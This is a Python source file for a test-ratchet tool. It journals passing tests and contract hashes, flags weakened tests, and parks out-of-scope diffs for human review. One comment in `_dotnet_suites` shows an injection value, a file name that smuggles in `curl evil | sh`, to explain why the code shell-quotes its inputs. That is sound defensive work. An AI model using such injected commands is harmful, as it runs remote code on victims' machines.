                verifier_hashes.setdefault(ref, h)
        for cid, h in (rec.get("amended", {}) or {}).items():
            contract_hashes[canonical_id(cid)] = h
        for cid in rec.get("retired", []) or []:
            contract_hashes.pop(canonical_id(cid), None)
        for ref, h in (rec.get("amended_verifiers", {}) or {}).items():
            verifier_hashes[ref] = h
        for ref in rec.get("retired_verifiers", []) or []:
            verifier_hashes.pop(ref, None)
        # Pass-set retirement (#262). Without this the pass-set is a ONE-WAY
        # door: derive_highwater only ever unioned it, while `missing_tests` is
        # an unconditional hard failure — so a renamed or re-parametrised test
        # pinned its old id forever, fixable only by rewriting a tamper-evident
        # hash chain. Applied in journal order, so a later merged record can
        # legitimately re-introduce a case.
        pass_set -= retire_case_matches(pass_set, rec.get("retired_cases", []) or [])
    return {
        "pass_set": sorted(pass_set),
        "contract_hashes": contract_hashes,
        "verifier_test_hashes": verifier_hashes,
        "quality": derive_quality_highwater(records),
    }


def violations(scorecard: dict, highwater: dict) -> dict:
    cur_pass = set(scorecard.get("pass_set", []))
    # Canonicalize both sides of the join (see derive_highwater) so a scorecard
    # written by an older version cannot make canonical high-water keys look
    # removed, and vice versa.
    cur_defs = {canonical_id(c): h for c, h in (scorecard.get("contract_hashes", {}) or {}).items()}
    missing = sorted(set(highwater["pass_set"]) - cur_pass)
    weakened, removed = [], []
    for cid, h in sorted(highwater["contract_hashes"].items()):
        if cid not in cur_defs:
            removed.append(cid)
        elif cur_defs[cid] != h:
            weakened.append(cid)
    # Verifier-test bodies (#206): a high-water verifier test whose body hash
    # changed was rewritten behind its still-green test ID (channel C1c); one
    # that vanished was removed. Verifier refs are file::function keys, not
    # stable IDs — no canonicalization. Highwater caches written before the
    # dimension existed lack the key; tolerate them.
    cur_v = scorecard.get("verifier_test_hashes", {}) or {}
    vweakened, vremoved = [], []
    for ref, h in sorted((highwater.get("verifier_test_hashes", {}) or {}).items()):
        if ref not in cur_v:
            vremoved.append(ref)
        elif cur_v[ref] != h:
            vweakened.append(ref)
    return {
        "missing_tests": missing,
        "weakened_contracts": weakened,
        "removed_contracts": removed,
        "weakened_verifier_tests": vweakened,
        "removed_verifier_tests": vremoved,
    }


# ---- subcommands ---------------------------------------------------------------


def _read_scorecard(cfg: Config) -> dict:
    if not cfg.scorecard.is_file():
        sys.stderr.write("ratchet: no scorecard — run `ratchet.py score` first.\n")
        sys.exit(3)
    return json.loads(cfg.scorecard.read_text())


def _write_json(path: Path, data: dict) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(data, indent=2, sort_keys=True) + "\n")


def _slug(text: str) -> str:
    """Filesystem-safe slug for a repo-controlled name used in a path."""
    return re.sub(r"[^A-Za-z0-9._-]", "-", text).strip("-.") or "target"


def _dotnet_suites(repo: Path) -> list[dict]:
    """Autodetected .NET suite(s), via the SAME ``chief_wiggum.verification``
    probe the adoption survey uses — so the survey's runner detection and the
    ratchet's suite autodetection can never disagree (#259: they did, silently,
    across 8,316 .cs files).

    `--logger trx` is the built-in VSTest logger: no NuGet package to add,
    unlike a junit logger. `--results-directory` (never a fixed LogFileName)
    because one logger runs PER TEST PROJECT — a fixed filename makes projects
    overwrite each other and silently undercount the pass-set. Each solution
    gets its own suite and its own results directory, because a bare
    `dotnet test` fails outright (MSB1011) when a root holds several.

    Note `dotnet test` builds into per-project bin/obj inside the tree, which
    a standard .NET .gitignore covers.
    """
    from chief_wiggum import verification  # noqa: PLC0415 — avoids an import cycle

    det = verification.detect_project(repo)
    if not det.has_dotnet:
        return []
    targets = verification.dotnet_test_targets(det.dotnet_solutions, det.dotnet_projects)
    if not targets:
        # Detected .NET, but no target `dotnet test` can actually run. Emitting
        # a command known to fail would produce an empty pass-set that reads
        # like a clean one — the #259 failure mode. Emit nothing; /status then
        # reports the gap with a reason.
        return []

    def suite(name: str, results: str, target: str) -> dict:
        # `run_suite` executes `cmd` through a shell, and every dynamic token
        # here is a TARGET-REPO-CONTROLLED filename — adoption runs against
        # third-party repos, so a solution named `x"; curl evil | sh; #.sln`
        # would otherwise be executed verbatim. Quote every interpolation.
        return {
            "name": name,
            "cmd": (f"dotnet test {shlex.quote(target)} --logger trx "
                    f"--results-directory {shlex.quote(results)}"),
            "cwd": ".",
            "parser": "trx",
            "report": results,
        }

    if len(targets) == 1:
        return [suite("dotnet", ".ratchet-trx", targets[0])]
    # Distinct, filesystem-safe results dirs: a shared one would let one
    # target's pre-run clear delete another's results mid-score. The index
    # keeps them unique even if two stems sanitize to the same string.
    return [
        suite(f"dotnet-{_slug(Path(t).stem)}", f".ratchet-trx-{i}-{_slug(Path(t).stem)}", t)
        for i, t in enumerate(targets)
    ]


def detect_suites(repo: Path) -> list[dict]:
    suites: list[dict] = []
    if (repo / "go.mod").is_file():
        suites.append(
            {"name": "go", "cmd": "go test -json -count=1 ./...", "cwd": ".", "parser": "go-test-json"}
        )
    if (repo / "pyproject.toml").is_file() or (repo / "pytest.ini").is_file():
        suites.append(
            {
                "name": "pytest",
                "cmd": "python3 -m pytest --junit-xml=.ratchet-junit.xml -q",
                "cwd": ".",
                "parser": "junit-xml",
                "report": ".ratchet-junit.xml",
            }
        )
    suites += _dotnet_suites(repo)
    if (repo / "package.json").is_file() and not suites:
        # JS runners need a junit reporter configured; leave a skeleton the
        # operator fills in (e.g. vitest --reporter=junit, jest-junit).
        suites.append(
            {"name": "js", "cmd": "npm test", "cwd": ".", "parser": "junit-xml", "report": "junit.xml"}
        )
    return suites


def cmd_init(args) -> int:
    repo = repo_root(args.repo)
    resolver = artifacts.Resolver.resolve(repo)
    path = resolver.quality_dir() / CONFIG_NAME
    if path.is_file() and not args.force:
        print(f"ratchet: config already exists at {path}")
        return 0
    # F1 (#213): on a sidecar-elected target the epic artifacts live OUTSIDE
    # the tree — the embedded default "docs/epics" is target-relative and
    # would hash nothing there, making the contract ratchet silently vacuous.
    # Write the ABSOLUTE sidecar epics dir instead; embedded keeps the
    # portable relative default.
    if resolver.mode == "sidecar":
        epic_docs = str(resolver.epics_dir())
    else:
        epic_docs = "docs/epics"
    cfg = {
        "suites": detect_suites(repo),
        "epic_docs": epic_docs,
        "protected_paths": list(DEFAULT_PROTECTED),
        "quality_tolerance": dict(DEFAULT_QUALITY_TOLERANCE),
    }
    _write_json(path, cfg)
    print(f"ratchet: wrote {path} ({len(cfg['suites'])} suite(s) autodetected)")
    if not cfg["suites"]:
        print("ratchet: no test runner detected — add a suite to the config by hand")
    return 0


def cmd_score(args) -> int:
    cfg = load_config(repo_root(args.repo))
    contract_hashes = load_contract_hashes(cfg)
    pass_set: set[str] = set()
    test_files: dict[str, str] = {}
    for suite in cfg.suites:
        if args.no_tests:
            break
        ids, files = run_suite(cfg, suite)
        pass_set |= ids
        test_files.update(files)
    quality = {"skipped": "quality metrics disabled (--no-quality)"}
    if not args.no_quality:
        quality = score_quality(cfg, venv=args.venv, gobin=args.gobin)
    # Verifier-test body hashes (#206): tests annotated `@cw-trace verifies`
    # are goalposts — their bodies are hashed and ratcheted like contract
    # definitions. Files the extractor cannot hash are SURFACED, not dropped.
    vscan = scan_verifier_hashes(cfg.repo)
    sc = {
        "passed": len(pass_set),
        "pass_set": sorted(pass_set),
        "contract_hashes": contract_hashes,
        "verifier_test_hashes": vscan.hashes,
        "verifier_targets": vscan.targets,
        "test_files": test_files,
        "test_files_unresolved": sorted(cid for cid in pass_set if cid not in test_files),
        "tests_run": not args.no_tests,
        "quality": quality,
        # Version binding (#213 F12): the target HEAD this scorecard was
        # computed against — mandatory for sidecar staleness detection
        # (Resolver.check_stale), harmless in embedded mode (None outside a
        # git repo). /status warns when it no longer matches HEAD.
        "target_sha": artifacts.head_sha(cfg.repo),
    }
    if vscan.unscanned:
        sc["verifier_unscanned"] = vscan.unscanned
        sys.stderr.write(
            "ratchet: verifier annotations the extractor could not hash "
            "(see docs/ratchet.md — surfaced, never silently dropped):\n"
            + "".join(f"  {reason}: {n}\n" for reason, n in sorted(vscan.unscanned.items()))
        )
    _write_json(cfg.scorecard, sc)
    if "skipped" in quality:
        qmsg = f"quality={quality['skipped']}"
    else:
        qmsg = (
            f"ccn_mean={quality.get('ccn_mean')} "
            f"pct_ccn_gt10={quality.get('pct_ccn_gt10')} "
            f"relative_churn={quality.get('relative_churn')}"
        )
    print(
        f"ratchet: scored — {len(pass_set)} passing case(s), "
        f"{len(contract_hashes)} contract definition(s), "
        f"{len(vscan.hashes)} verifier test hash(es); {qmsg}"
    )
    return 0


def suspect_links_for(cfg: Config, sc: dict) -> list[dict]:
    """Suspect links (#169) visible from THIS scorecard's contract hashes.

    Cross-references the ``docs/quality/trace-links.json`` sidecar (written by
    ``check_traceability.py --write-links`` once its gate passes) against the
    CURRENT scorecard's ``contract_hashes``: a link recorded against a hash
    that no longer matches means the contract it claims to guard/verify
    changed since that claim was last validated. A definition-hash change with
    surviving suspect links must be VISIBLE here, not silently absorbed into
    "the ratchet held" — report-only (see docs/gate-rollout.md); it does not
    change ``check``'s exit code.
    """
    # The trace-links sidecar lives beside the rest of the ratchet state — in
    # cfg.state_dir, which the #213 resolver already routed (embedded:
    # <repo>/docs/quality, i.e. exactly <repo>/SIDECAR_RELPATH; sidecar mode:
    # the external quality dir).
    sidecar = load_sidecar(cfg.state_dir / Path(SIDECAR_RELPATH).name)
    return find_suspect_links(sidecar, sc.get("contract_hashes", {}) or {})


def cmd_check(args) -> int:
    cfg = load_config(repo_root(args.repo))
    hw = derive_highwater(load_journal(cfg))
    sc = _read_scorecard(cfg)
    v = violations(sc, hw)
    # Complexity/churn is a NEW, report-only dimension (docs/gate-rollout.md): it
    # prints its deltas vs the best-seen high-water but does NOT influence the
    # exit code unless the caller opts in with --gate-quality. The pass-set and
    # contract-hash gates keep their exact prior blocking semantics.
    qregs = quality_regressions(
        sc.get("quality", {}) or {}, hw.get("quality", {}) or {}, cfg.quality_tolerance
    )
    susp = suspect_links_for(cfg, sc)
    hard = {k: v[k] for k in ("missing_tests", "weakened_contracts", "removed_contracts")}
    # Verifier-test findings (#206) are a NEW dimension: report-only per
    # docs/gate-rollout.md until validated, blocking only under the opt-in
    # --gate-verifier-tests flag (mirroring --gate-quality's rollout).
    vfind = {k: v[k] for k in ("weakened_verifier_tests", "removed_verifier_tests")}
    gate_verifier = getattr(args, "gate_verifier_tests", False)
    if args.format == "json":
        print(json.dumps(
            {**hard, **vfind, "quality_regressions": qregs, "suspect_links": susp}, indent=2))
    else:
        if any(vfind.values()):
            tag = "VIOLATED (gated)" if gate_verifier else "report-only"
            sys.stderr.write(
                f"ratchet: verifier-test body changes [{tag}] — a `@cw-trace verifies` "
                "test was rewritten/removed behind its test ID (channel C1c; "
                "see docs/ratchet.md):\n")
            for ref in vfind["weakened_verifier_tests"]:
                sys.stderr.write(f"  weakened: {ref}\n")
            for ref in vfind["removed_verifier_tests"]:
                sys.stderr.write(f"  removed:  {ref}\n")
        if qregs:
            tag = "VIOLATED (gated)" if args.gate_quality else "report-only"
            sys.stderr.write(f"ratchet: complexity/churn regressions [{tag}]:\n")
            for r in qregs:
                sys.stderr.write(
                    f"  {r['metric']}: {r['current']} > limit {r['limit']} "
                    f"(best {r['best']}, +{r['delta']})\n"
                )
        if susp:
            sys.stderr.write(
                f"ratchet: {len(susp)} suspect link(s) [report-only] — a definition changed "
                "since the link was last validated (see docs/traceability.md):\n"
            )
            for s in susp:
                sys.stderr.write(f"  {s['file']}:{s['line']} {s['verb']} {s['target']}\n")
    if any(hard.values()):
        if args.format != "json":
            sys.stderr.write(
                "ratchet: VIOLATED —"
                f" missing_tests={hard['missing_tests']}"
                f" weakened_contracts={hard['weakened_contracts']}"
                f" removed_contracts={hard['removed_contracts']}\n"
            )
        return 1
    if gate_verifier and any(vfind.values()):
        return 1
    if args.gate_quality and qregs:
        return 1
    if args.format != "json":
        print("ratchet: OK (pass-set and contract definitions hold the high-water mark)")
    return 0


def cmd_regressed(args) -> int:
    cfg = load_config(repo_root(args.repo))
    hw = derive_highwater(load_journal(cfg))
    sc = _read_scorecard(cfg)
    out = violations(sc, hw)
    out["quality_regressions"] = quality_regressions(
        sc.get("quality", {}) or {}, hw.get("quality", {}) or {}, cfg.quality_tolerance
    )
    out["suspect_links"] = suspect_links_for(cfg, sc)
    print(json.dumps(out, indent=2))
    return 0


def cmd_record(args) -> int:
    cfg = load_config(repo_root(args.repo))
    records = load_journal(cfg)
    sc = _read_scorecard(cfg)
    prev_hw = derive_highwater(records)
    new_pass = set(sc.get("pass_set", []))
    if args.merged and not set(prev_hw["pass_set"]) <= new_pass:
        status = "violated"
    elif new_pass - set(prev_hw["pass_set"]):
        status = "advanced"
    else:
        status = "held"
    amended = {}
    for cid in args.amend or []:
        cid = canonical_id(cid)  # match hash_epic_definitions' canonical keys
        if cid not in sc.get("contract_hashes", {}):
            raise RatchetError(f"--amend {cid}: not defined in the current epic docs")
        amended[cid] = sc["contract_hashes"][cid]
    # Verifier-test re-baselining (#206): --amend-verifier moves one test's
    # body baseline (a deliberate refactor).
    cur_v = sc.get("verifier_test_hashes", {}) or {}
    v_targets = sc.get("verifier_targets", {}) or {}
    hw_v = prev_hw.get("verifier_test_hashes", {}) or {}
    amended_verifiers = {}
    for ref in args.amend_verifier or []:
        if ref not in cur_v:
            raise RatchetError(
                f"--amend-verifier {ref}: no `@cw-trace verifies` test with that "
                "ref in the current scorecard (run `score` first; ref form is "
                "<relpath>::<function>)")
        amended_verifiers[ref] = cur_v[ref]
    # Amending a CONTRACT does NOT silently bless its verifier tests' new
    # bodies (#206 soundness review): that would let a C1c rewrite ride along
    # invisibly on an unrelated contract-wording amend. Instead, a verifier
    # test of an amended contract whose body CHANGED vs the high-water mark
    # must be acknowledged EXPLICITLY with --amend-verifier — so every blessed
    # body change is a named, journaled, operator-visible act. (An unchanged
    # body needs nothing: its hash already matches, no violation to clear.)
    needs_explicit = []
    for cid in amended:
        for ref, targets in v_targets.items():
            if cid not in targets or ref not in cur_v:
                continue
            if ref in hw_v and cur_v[ref] != hw_v[ref] and ref not in amended_verifiers:
                needs_explicit.append(ref)
    if needs_explicit:
        raise RatchetError(
            "--amend of a contract whose verifier test body ALSO changed must "
            "bless that test explicitly (channel C1c — a body rewrite must not "
            "ride along invisibly on a contract amend). Re-run adding: "
            + " ".join(f"--amend-verifier {r}" for r in sorted(set(needs_explicit))))
    # --retire-verifier removes a ref from the high-water mark (its test was
    # legitimately deleted). Validate against the high-water — you can only
    # retire what is actually tracked — so a typo'd ref is SURFACED, not a
    # silent no-op (docs/gate-rollout.md doctrine). A ref absent from
    # high-water is either a typo or an already-retired ref; either way the
    # human should know their retire did nothing.
    retired_verifiers = sorted(set(args.retire_verifier or []))
    hw_v = prev_hw.get("verifier_test_hashes", {}) or {}
    for ref in retired_verifiers:
        if ref not in hw_v:
            raise RatchetError(
                f"--retire-verifier {ref}: not in the current high-water mark "
                "(nothing to retire — check the ref, form is <relpath>::<function>)")
    # --retire-case drops a pass-set case from the high-water mark: the test was
    # renamed, re-parametrised, or legitimately deleted. Validated against the
    # high-water mark for the same reason as --retire-verifier — a pattern that
    # matches nothing is a typo, and a silent no-op would leave the operator
    # believing they had cleared a goalpost they had not.
    # getattr, not args.retire_case: other entry points (adopt.py, the wave
    # runner, tests) build their own record namespaces and predate this flag.
    retired_cases = sorted(set(getattr(args, "retire_case", None) or []))
    hw_pass = set(prev_hw.get("pass_set", []) or [])
    for pat in retired_cases:
        if not retire_case_matches(hw_pass, [pat]):
            raise RatchetError(
                f"--retire-case {pat}: matches no case in the current high-water "
                "mark (nothing to retire — check the id; `*` is the only "
                "wildcard, e.g. 'pytest::tests.test_x::test_p[*]')")
    body = {
        "record_id": f"rec-{len(records) + 1:05d}",
        "event": args.event,
        "ref": args.ref,
        "gate_result": args.gate,
        "merged": bool(args.merged),
        "scorecard": sc,
        "amended": amended,
        "retired": sorted(canonical_id(c) for c in (args.retire or [])),
        "amended_verifiers": amended_verifiers,
        "retired_verifiers": retired_verifiers,
        "retired_cases": retired_cases,
        "ratchet_status": status,
        "notes": args.notes,
    }
    prev = records[-1]["record_hash"] if records else "genesis"
    body["record_hash"] = stable_hash(prev, json.dumps({k: v for k, v in body.items() if k != "record_hash"}, sort_keys=True))
    cfg.journal.parent.mkdir(parents=True, exist_ok=True)
    with cfg.journal.open("a") as f:
        f.write(json.dumps(body, sort_keys=True) + "\n")
    _write_json(cfg.highwater, derive_highwater(load_journal(cfg)))  # display cache
    print(
        f"ratchet: recorded {body['record_id']} event={args.event} ref={args.ref!r} "
        f"gate={args.gate} merged={bool(args.merged)} status={status}"
    )
    return 0


def cmd_recent(args) -> int:
    cfg = load_config(repo_root(args.repo))
    for rec in load_journal(cfg)[-args.n:]:
        # gate-authority events (chief-wiggum#198) carry no ratchet_status/
        # gate_result — tolerate their absence rather than KeyError.
        if rec.get("event") == GATE_AUTHORITY:
            print(f"- {rec['record_id']} [authority] {rec['event']} {rec['ref']} "
                  f"action={rec.get('details')} wired_rid={rec.get('wired_rid')}")
            continue
        print(
            f"- {rec['record_id']} [{rec.get('ratchet_status', '?')}] {rec['event']} {rec['ref']} "
            f"gate={rec.get('gate_result', '?')} merged={rec.get('merged', False)}: {rec.get('notes', '')}"
        )
    return 0


def cmd_highwater(args) -> int:
    cfg = load_config(repo_root(args.repo))
    print(json.dumps(derive_highwater(load_journal(cfg)), indent=2))
    return 0


def _glob_to_re(pattern: str) -> re.Pattern:
    out, i = [], 0
    while i < len(pattern):
        c = pattern[i]
        if c == "*":
            if pattern[i : i + 2] == "**":
                out.append(".*")
                i += 2
                if i < len(pattern) and pattern[i] == "/":
                    i += 1
                continue
            out.append("[^/]*")
        elif c == "?":
            out.append("[^/]")
        else:
            out.append(re.escape(c))
        i += 1
    return re.compile("^" + "".join(out) + "$")


def protected_hits(cfg: Config, changed: list[str]) -> list[str]:
    patterns = [_glob_to_re(p) for p in cfg.protected_paths]
    return sorted(f for f in changed if any(p.match(f) for p in patterns))


def highwater_test_file_cue(cfg: Config, changed: list[str]) -> None:
    """Report-only scrutiny cue (#207): note when the branch diff modifies a
    file (or go package dir) hosting high-water pass-set tests. NEVER affects
    the exit code — the blocking answer to test-body rewrites is the
    verifier-hash dimension (#206); this is the day-one reviewer cue for
    everything else. Degrades gracefully and VISIBLY: a broken journal chain
    or missing scorecard says so instead of silently skipping."""
    try:
        hw_pass = set(derive_highwater(load_journal(cfg))["pass_set"])
    except TamperError:
        sys.stderr.write(
            "ratchet: note — journal chain broken; high-water test-file cue "
            "unavailable (run `check` for the failing record)\n")
        return
    if not hw_pass:
        return
    if not cfg.scorecard.is_file():
        sys.stderr.write(
            "ratchet: note — no scorecard; high-water test-file cue unavailable "
            "(run `score` first)\n")
        return
    sc = json.loads(cfg.scorecard.read_text())
    tf = sc.get("test_files", {}) or {}
    hosts: dict[str, list[str]] = {}
    for cid in sorted(hw_pass):
        f = tf.get(cid)
        if f:
            hosts.setdefault(f, []).append(cid)
    touched: dict[str, list[str]] = {}
    for f in changed:
        for host, cids in hosts.items():
            if f == host or f.startswith(host.rstrip("/") + "/"):
                touched.setdefault(host, cids)
    if touched:
        sys.stderr.write(
            f"ratchet: note — {len(touched)} high-water test file(s) modified on "
            "this branch; scrutinize the test diffs before merge (a body rewrite "
            "keeps its test ID green — see docs/ratchet.md, channel C1c):\n")
        for host, cids in sorted(touched.items()):
            sys.stderr.write(f"  {host}\n")
            for cid in cids:
                sys.stderr.write(f"    hosts high-water case {cid}\n")


def cmd_protected(args) -> int:
    cfg = load_config(repo_root(args.repo))
    changed = _changed_files(cfg.repo, args.base)
    hits = protected_hits(cfg, changed)
    highwater_test_file_cue(cfg, changed)
    if hits:
        sys.stderr.write(
            "ratchet: PROTECTED PATHS TOUCHED — park for human review, do not merge:\n"
            + "".join(f"  {h}\n" for h in hits)
        )
        return 1
    print("ratchet: no protected paths touched")
    return 0


# ---- sanctioned pathset (chief-wiggum#213) --------------------------------------
#
# The INVERSE of `protected`: protected parks a diff that touches a small set of
# goalpost paths; `pathset` parks a diff that ESCAPES a sanctioned set — the
# same park-for-human semantics, pointed at scope creep instead of goalpost
# moves. One mechanism, parameterized by pathset SOURCE (two shapes):
#
#   {"paths": [globs], "source": "..."}      an explicit (e.g. ticket-scoped)
#       sanctioned pathset — a changed file is sanctioned iff it matches one of
#       the globs (same _glob_to_re grammar as protected_paths). #216 feeds a
#       --from-debt ticket's DEBT- locations + declared collateral through this.
#
#   {"include": [globs], "exclude": [globs]} the domain scope.json
#       (scripts/artifacts.py semantics: missing include = everything, exclude
#       wins) — a changed file outside the domain scope is parked.


def _changed_files(repo: Path, base: str) -> list[str]:
    proc = subprocess.run(
        ["git", "diff", "--name-only", f"{base}...HEAD"],
        cwd=repo, capture_output=True, text=True,
    )
    if proc.returncode != 0:
        raise RatchetError(f"git diff failed: {proc.stderr.strip()}")
    return proc.stdout.splitlines()


def load_pathset(path: str | Path) -> dict:
    """Load and shape-check a sanctioned-pathset file. Raises RatchetError on a
    missing/unparsable file or an unrecognized shape — a typo'd pathset must
    never silently sanction everything (or nothing)."""
    p = Path(path)
    if not p.is_file():
        raise RatchetError(f"pathset file not found: {p}")
    try:
        spec = json.loads(p.read_text())
    except (OSError, json.JSONDecodeError) as e:
        raise RatchetError(f"cannot parse pathset file {p}: {e}") from e
    if not isinstance(spec, dict):
        raise RatchetError(f"pathset file {p} must be a JSON object")
    has_paths = "paths" in spec
    has_scope = "include" in spec or "exclude" in spec
    if has_paths and has_scope:
        raise RatchetError(
            f"pathset file {p} mixes 'paths' with 'include'/'exclude' — use one shape"
        )
    if not has_paths and not has_scope:
        raise RatchetError(
            f"pathset file {p} has neither 'paths' nor 'include'/'exclude' "
            f"(found key(s): {', '.join(sorted(spec)) or '(none)'}) — not a pathset; "
            "a typo'd key must never silently sanction everything (or nothing)"
        )
    # Unknown keys are a hard error, not a shrug (#213 F6): {"includes": ...}
    # beside a valid "exclude" must not silently drop the include list.
    allowed = {"paths", "source", "$comment"} if has_paths else {
        "include", "exclude", "source", "$comment"}
    unknown = sorted(set(spec) - allowed)
    if unknown:
        raise RatchetError(
            f"pathset file {p} has unknown key(s): {', '.join(unknown)} "
            f"(allowed: {', '.join(sorted(allowed))})"
        )
    return spec


def pathset_outside(spec: dict, changed: list[str]) -> list[str]:
    """Changed files that fall OUTSIDE the sanctioned pathset — the park set.
    Pure function of (spec, changed); shape decides the matching rule."""
    if "paths" in spec:
        patterns = [_glob_to_re(g) for g in (spec.get("paths") or [])]
        return sorted(f for f in changed if f and not any(p.match(f) for p in patterns))
    # scope.json shape — delegate to the single scope-matching implementation.
    return sorted(f for f in changed if f and not artifacts.path_in_scope(spec, f))


def cmd_pathset(args) -> int:
    # Deliberately config-free (unlike `protected`): the sanctioned set comes
    # from the pathset file, so this works on targets with no ratchet init —
    # #216 consumes it report-only first (docs/gate-rollout.md).
    repo = repo_root(args.repo)
    spec = load_pathset(args.pathset_file)
    changed = _changed_files(repo, args.base)
    outside = pathset_outside(spec, changed)
    source = spec.get("source") or str(args.pathset_file)
    if outside:
        tag = "report-only" if args.report_only else "park for human review, do not merge"
        sys.stderr.write(
            f"ratchet: FILES OUTSIDE THE SANCTIONED PATHSET ({source}) — {tag}:\n"
            + "".join(f"  {f}\n" for f in outside)
        )
        return 0 if args.report_only else 1
    print(f"ratchet: all changed files within the sanctioned pathset ({source})")
    return 0


def _scanner_version() -> str:
    """Hash-derived ``--scanner-version``: the source of this module plus its
    finding-affecting local dependencies (hashing.py for
    stable_hash/hash_epic_definitions, trace_ids.py for the shared stable-ID
    grammar, trace_links.py for suspect-link propagation, verification.py for
    the .sln/.csproj probe that decides whether a .NET suite is autodetected
    at all, and the lazily imported quality engines churn.py/complexity.py
    that shape the quality_regressions findings ``check`` reports). No
    hand-bumped constant to forget (INV-fh-005).
    @cw-trace guards CTR-fh-040 CTR-fh-041 CTR-fh-042 INV-fh-005"""
    here = Path(__file__).resolve()
    cw_dir = here.parent / "chief_wiggum"
    q_dir = here.parent / "quality"
    return scanner_version(
        here,
        here.parent / "artifacts.py",
        cw_dir / "hashing.py",
        cw_dir / "trace_ids.py",
        cw_dir / "trace_links.py",
        cw_dir / "verification.py",
        cw_dir / "verifier_hashes.py",
        q_dir / "churn.py",
        q_dir / "complexity.py",
    )


def main() -> int:
    # ratchet's CLI is subcommand-based (dest="cmd", required=True below), so
    # --scanner-version can't be reached via `args.scanner_version` after
    # parse_args() the way the single-positional gate scripts do — a missing
    # subcommand would already have failed argparse's own validation. Checked
    # directly against argv instead, so `ratchet.py --scanner-version` (no
    # subcommand) works, prints, and exits 0 with no other action — same
    # contract as the other four scanner-version gates.
    if "--scanner-version" in sys.argv[1:]:
        print(_scanner_version())
        return 0

    p = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter
    )
    p.add_argument(
        "--scanner-version",
        action="store_true",
        help="Print the hash-derived scanner version (source hash of this module + its "
        "chief_wiggum deps) and exit; works with no subcommand",
    )
    sub = p.add_subparsers(dest="cmd", required=True)

    def common(sp):
        sp.add_argument("--repo", help="target repo root (default: git toplevel of cwd)")

    sp = sub.add_parser("init", help="write a starter config")
    common(sp)
    sp.add_argument("--force", action="store_true")

    sp = sub.add_parser("score", help="run suites + hash contracts, write scorecard")
    common(sp)
    sp.add_argument("--no-tests", action="store_true", help="contract hashes only (cheap baseline)")
    sp.add_argument("--no-quality", action="store_true",
                    help="skip the complexity/churn snapshot (skip if lizard is unavailable)")
    sp.add_argument("--venv", default=None, help="virtualenv with lizard/radon for the quality snapshot")
    sp.add_argument("--gobin", default=None, help="dir containing gocognit for the quality snapshot")

    for name in ("check", "regressed", "highwater", "recent"):
        sp = sub.add_parser(name)
        common(sp)
        if name == "check":
            sp.add_argument("--format", choices=["text", "json"], default="text")
            sp.add_argument("--gate-verifier-tests", action="store_true",
                            help="ALSO exit 1 on weakened/removed verifier-test bodies "
                                 "(#206; report-only by default per docs/gate-rollout.md)")
            sp.add_argument("--gate-quality", action="store_true",
                            help="also block on complexity/churn regressions "
                                 "(off by default — report-only, see docs/gate-rollout.md)")
        if name == "recent":
            sp.add_argument("--n", type=int, default=5)

    sp = sub.add_parser("record", help="append a hash-chained journal record")
    common(sp)
    sp.add_argument(
        "--event", required=True,
        choices=["baseline", "ticket", "wave", "epic-close", "gate-validation"],
    )
    sp.add_argument(
        "--ref", default="",
        help="ticket #, wave number, epic slug, or (for gate-validation) the gate name",
    )
    sp.add_argument("--gate", default="pass", choices=["pass", "fail"])
    sp.add_argument("--merged", action="store_true", help="the change reached the default branch")
    sp.add_argument("--notes", default="")
    sp.add_argument("--amend-verifier", action="append", metavar="TESTREF",
                    help="re-baseline one verifier test's body hash "
                         "(<relpath>::<function>; a deliberate, journaled refactor)")
    sp.add_argument("--retire-verifier", action="append", metavar="TESTREF",
                    help="drop a verifier test ref from the high-water mark")
    sp.add_argument("--amend", action="append", metavar="ID",
                    help="accept ID's current definition hash as the new baseline (human-approved)")
    sp.add_argument("--retire", action="append", metavar="ID",
                    help="drop ID from the high-water mark (human-approved)")
    sp.add_argument("--retire-case", action="append", metavar="CASE",
                    help="drop a test CASE id from the pass-set high-water mark "
                         "(a renamed/re-parametrised/deleted test; `*` is the "
                         "only wildcard, e.g. 'pytest::tests.test_x::test_p[*]')")

    sp = sub.add_parser("protected", help="flag branch diffs touching the protected pathset")
    common(sp)
    sp.add_argument("--base", default="origin/main")

    sp = sub.add_parser(
        "pathset",
        help="flag branch diffs ESCAPING a sanctioned pathset (chief-wiggum#213) — "
             "park-for-human semantics, inverse of `protected`",
    )
    common(sp)
    sp.add_argument("--base", default="origin/main")
    sp.add_argument(
        "--pathset-file", required=True, metavar="JSON",
        help="Sanctioned-pathset source: {'paths': [globs], 'source': ...} (explicit "
             "ticket pathset) or a domain scope.json {'include': [...], 'exclude': [...]}",
    )
    sp.add_argument(
        "--report-only", action="store_true",
        help="Print out-of-pathset files but exit 0 (docs/gate-rollout.md — how #216 "
             "consumes this first)",
    )

    args = p.parse_args()
    dispatch = {
        "init": cmd_init, "score": cmd_score, "check": cmd_check,
        "regressed": cmd_regressed, "record": cmd_record, "recent": cmd_recent,
        "highwater": cmd_highwater, "protected": cmd_protected, "pathset": cmd_pathset,
    }
    try:
        return dispatch[args.cmd](args)
    except RatchetError as e:
        sys.stderr.write(f"ratchet: {e}\n")
        return 2
    except TamperError as e:
        sys.stderr.write(f"ratchet: {e}\n")
        return 4


if __name__ == "__main__":
    raise SystemExit(main())
